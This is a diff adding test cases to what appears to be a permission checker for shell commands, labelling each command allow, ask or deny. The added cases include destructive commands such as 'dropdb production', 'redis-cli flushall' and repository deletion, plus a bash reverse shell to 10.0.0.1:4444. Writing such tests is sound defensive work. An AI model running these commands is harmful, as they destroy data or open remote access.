@@ -601,3 +601,51 @@ cmd = "$(npm bin)/jest --ci"
 expect = "allow"
 why = "a command name that comes from an expansion is allowed in guarded"
 
+
+[[case]]
+cmd = "gh repo delete foo/bar --yes"
+expect = "ask"
+
+[[case]]
+cmd = "gh release delete v1.0.0"
+expect = "ask"
+
+[[case]]
+cmd = "gh api -X DELETE repos/a/b/git/refs/heads/x"
+expect = "ask"
+
+[[case]]
+cmd = "gh secret set TOKEN"
+expect = "ask"
+
+[[case]]
+cmd = "gh pr list"
+expect = "allow"
+
+[[case]]
+cmd = "find / -name '*.log' -delete"
+expect = "ask"
+
+[[case]]
+cmd = "find . -name '*.pyc' -delete"
+expect = "allow"
+
+[[case]]
+cmd = "shred -u notes.txt"
+expect = "allow"
+
+[[case]]
+cmd = "npm unpublish left-pad"
+expect = "ask"
+
+[[case]]
+cmd = "dropdb production"
+expect = "ask"
+
+[[case]]
+cmd = "redis-cli flushall"
+expect = "ask"
+
+[[case]]
+cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+expect = "deny"
